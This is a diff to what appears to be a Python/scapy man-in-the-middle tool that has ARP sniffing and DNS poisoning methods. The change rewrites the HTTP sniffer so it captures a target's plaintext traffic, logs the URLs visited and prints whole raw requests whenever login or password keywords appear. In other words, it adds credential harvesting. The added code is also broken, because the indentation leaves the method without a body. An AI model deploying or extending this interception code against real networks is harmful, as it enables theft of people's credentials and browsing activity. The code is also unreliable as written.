@@ -81,10 +81,29 @@ class Device:
         sniff(iface=self.iface, prn=arp_pkt_callback, filter=f'arp and host {self.targetip}', store=0)
 
     def http_sniff(self):
-        def http_pkt_callback(pkt):
-            if pkt.haslayer('Raw'):
-                print(f'{Fore.MAGENTA}HTTP Packet: {pkt["Raw"].load}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)
+    def http_pkt_callback(pkt):
+        if pkt.haslayer('Raw'):
+            raw_data = pkt['Raw'].load.decode('utf-8', errors='ignore')
+            lines = raw_data.split('\r\n')
+            host = ''
+            path = ''
+            creds_found = False
+
+            for line in lines:
+                if line.startswith("Host:"):
+                    host = line.split("Host:")[1].strip()
+                if line.startswith("GET") or line.startswith("POST"):
+                    path = line.split()[1]
+                if any(keyword in line.lower() for keyword in ["username", "user", "email", "password", "passwd", "login"]):
+                    creds_found = True
+
+            if host and path and not creds_found:
+                print(f'{Fore.CYAN}Visited Page: http://{host}{path}{Style.RESET_ALL}')
+            elif creds_found:
+                print(f'{Fore.RED}Possible Credentials Detected:{Style.RESET_ALL}\n{Fore.YELLOW}{raw_data}{Style.RESET_ALL}')
+
+    sniff(iface=self.iface, prn=http_pkt_callback, filter=f'tcp port 80 and host {self.targetip}', store=0)
+
 
     def dns_poison(self, spoof_ip):
         def dns_pkt_callback(pkt):
